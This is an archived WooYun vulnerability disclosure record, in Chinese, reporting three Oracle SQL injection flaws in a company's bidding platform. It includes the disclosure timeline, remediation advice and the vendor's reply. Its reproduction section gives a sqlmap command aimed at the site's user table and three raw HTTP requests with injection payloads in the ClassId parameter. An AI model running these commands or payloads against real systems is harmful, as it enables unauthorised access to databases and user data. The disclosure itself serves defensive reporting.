{"id": 88554, "wybug_id": "wooyun-2016-0212358", "wybug_title": "鞍钢建设集团某交易平台oracle SQL注入3处                                      ", "wybug_corp": "鞍钢建设集团", "wybug_author": "路人甲", "wybug_date": "2016-05-24 17:50", "wybug_open_date": "2016-07-10 15:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-10：\t细节向公众公开  简要描述： 当用户可控的数据未经过恰当的处理就进入了数据库执行的SQL语句中时，就可能存在SQL注入漏洞。攻击者可以定制特定的字符来改变SQL语句的语义。通过SQL注入漏洞可以造成多种危害，包括读取或者修改应用的数据，改变程序逻辑，提升权限和执行操作系统命令等。 详细说明：  1、漏洞触发页面以及对应功能:招标交易平台。\n\nhttp://**.**.**.**/ForePage/Skin/NewList1.aspx?ClassId=164&title=%E6%96%B0%E9%97%BB%E5%8A%A8%E6%80%812、漏洞复现具体流程，包含具体payload和完整的数据包：\npython sqlmap.py -u \"http://**.**.**.**/ForePage/Skin/NewList1.aspx?ClassId=164&title=%E6%96%B0%E9%97%BB%E5%8A%A8%E6%80%81\" -p ClassId --random-agent -o -D LXSOFT  -T USERS --users\n1，\nGET /ForePage/Skin/NewGroupList.aspx?ClassId=164%20AND%203*2*1%3d6%20AND%20495%3d495&flag=6&ParentId=1 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: **.**.**.**Cookie: ASP.NET_SessionId=jfcn0szve5d1cwo3a1wqlh3cHost: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*\n2，\nGET /ForePageNew/Skin/NewBlockList.aspx?ClassId=192%20AND%203*2*1%3d6%20AND%20764%3d764&flag=6&ParentId=1 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: **.**.**.**Cookie: ASP.NET_SessionId=jfcn0szve5d1cwo3a1wqlh3cHost: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*\n3，\nGET /ForePageNew/Skin/NewList1.aspx?ClassId=193%20AND%203*2*1%3d6%20AND%20240%3d240&flag=9&ParentId=1 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: **.**.**.**Cookie: ASP.NET_SessionId=jfcn0szve5d1cwo3a1wqlh3cHost: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*\n   漏洞证明：  数据库相关信息证明,仅证明，未存储下载任何敏感信息2000多个表。3万多个用户。\n\n\n\n\n\n   修复方案：  最有效的防御SQL注入的方式是在所有的数据库操作上使用参数化查询（也被称为预编译)。预编译通过两步把可能存在危害的数据整合到SQL查询中。第一步，应用定义查询语句的结构，在语句中预留位置给用户输入。第二部，应用把每个位置需要的用户输入传递给数据库。因为第一步中，应用已经定义了语句的结构，数据库已经对语法进行了编译，第二部中及时传入恶意的用户输入也无法影响SQL语句的语意，从而避免了SQL注入攻击。对于不同的数据库和编程语言需要查询文档，寻找合适的api。强烈建议使用参数化处理SQL语句中的每一个变量。需要注意的是以下一些防御SQL注入的方式并不总是有效的，所以不建议大家使用以下的方式防御SQL注入：一种常见的方式是在用户数据拼接到SQL语句之前转义其中的单引号。这是为了避免用户插入单引号，改变了SQL的语法。但是如果变量类型是数字型，这种防御就可能失败。因为SQL语句结构中并没有单引号包裹变量的话，仅仅使用空格就可以改变语法结构。另一种常见的防御方案是使用存储过程。尽管存储过程提供了很多安全特性，但是并不能保证防御SQL注入。当存储过程中可以动态创建SQL结构的时候就可能会发生SQL注入。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-05-26 15:13 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向能源行业信息化主管部门通报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-24 19:14 |    \t\t放逐 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 白帽子放逐Gg？得失乐与悲与Av Qq205655539)\t\t \n  qwq    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}